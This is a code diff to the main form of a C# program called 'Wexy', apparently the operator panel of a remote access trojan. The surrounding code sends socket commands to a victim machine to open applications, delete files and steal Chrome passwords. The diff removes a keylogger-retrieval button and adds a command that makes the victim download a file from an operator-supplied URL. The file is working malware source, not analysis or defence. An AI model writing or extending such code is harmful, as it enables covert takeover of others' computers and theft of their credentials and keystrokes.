@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using ComponentFactory.Krypton.Toolkit;
 using System.Net.Sockets;
 using System.IO;
+using System.Threading;
 namespace Wexy
 {
     public partial class MainForm : KryptonForm
@@ -100,6 +101,7 @@ namespace Wexy
         {
             while (true)
             {
+                Thread.Sleep(10);
                 try
                 {             
                     byte[] RecPacket = new byte[7000];
@@ -120,6 +122,7 @@ namespace Wexy
         {
             while (true)
             {
+                Thread.Sleep(10);
                 try
                 {
                     //195000 = 195 ko
@@ -209,6 +212,8 @@ namespace Wexy
         {
             string app_name = txb_filelocation.Text;
             SendCommand("openApp>" + app_name);
+            //ReceiveData();
+            //MessageBox.Show(received_data);
         }
 
         private void btn_displaymessage_Click(object sender, EventArgs e)
@@ -279,6 +284,8 @@ namespace Wexy
         {
             string location = txb_filelocation.Text;
             SendCommand("del>"+location+">");
+            //ReceiveData();
+            //MessageBox.Show(received_data);
         }
 
         private void btn_getchromepass_Click(object sender, EventArgs e)
@@ -352,12 +359,15 @@ namespace Wexy
             }
         }
 
-        private void btn_enablekeylogger_Click(object sender, EventArgs e)
-        {
-            SendCommand("getkeylogs>");
-            ReceiveFile("txt");
-            MessageBox.Show("The log file which contains the keys logged by the keyloggger was successfully captured !");            
-        }
         #endregion
+
+        private void btn_remote_download_Click(object sender, EventArgs e)
+        {
+            DownloadFileForm dff = new DownloadFileForm();
+            dff.ShowDialog();
+            string fileName = dff.GetFilename();
+            string url = dff.GetUrl();
+            SendCommand("remote>" + url +">"+fileName+">");
+        }
     }
 }
